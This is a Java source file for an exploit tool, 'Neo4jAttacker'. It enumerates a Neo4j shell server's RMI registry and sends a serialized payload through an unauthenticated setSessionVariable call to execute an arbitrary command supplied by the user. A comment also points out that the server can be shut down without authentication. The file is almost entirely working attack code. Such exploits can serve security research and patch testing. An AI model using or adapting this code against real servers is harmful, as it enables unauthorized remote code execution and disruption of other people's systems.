import java.io.Serializable;
import java.rmi.Naming;
import sun.rmi.registry.RegistryImpl_Stub;
import org.neo4j.shell.ShellServer;

public class Neo4jAttacker {
    public static String TARGET_BINDING = "shell";

    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.out.println("Usage: java -jar Neo4jAttacker.jar [target] [command]" +
                    "\nExample: java -jar Neo4jAttacker.jar rmi://127.0.0.1:1337 \"touch /tmp/success\"");
            System.exit(1);
        }

        boolean validBinding = checkBinding(TARGET_BINDING, args[0]);
        if (!validBinding)
        {
            System.out.println("[-] No valid binding found, shell server may not be listening. Exiting");
            System.exit(2);
        }

        System.out.println("[+] Found valid binding, proceeding to exploit");
        ShellServer server = (ShellServer) Naming.lookup(args[0] + "/" + TARGET_BINDING);

        Object payload = Payload.getObject(args[1]);

        //Here server.shutdown may also be callable without auth, just in case the exploit fails and you just want to turn the thing off
        try {
            server.setSessionVariable(newClientId(), "anything_here", payload);
        }
        catch (Exception UnmarshalException ) {
            System.out.println("[+] Caught an unmarshalled exception, this is expected.");
            System.out.println(UnmarshalException.getMessage());
        }
        System.out.println("[+] Exploit completed");
    }

    public static boolean checkBinding(String bindingToCheck, String targetToCheck) {

        System.out.println("Trying to enumerate server bindings: ");
        try {
            RegistryImpl_Stub stub = (RegistryImpl_Stub) Naming.lookup(targetToCheck);

            for (String element : stub.list()) {
                System.out.println("Found binding: " + element);
                if (element.equalsIgnoreCase(bindingToCheck))
                    return true;
            }
            return  false;
        }
        catch (Exception ex)
        {
            return false;
        }

    }

    public static Serializable newClientId() {
        return Integer.valueOf(1);
    }
}
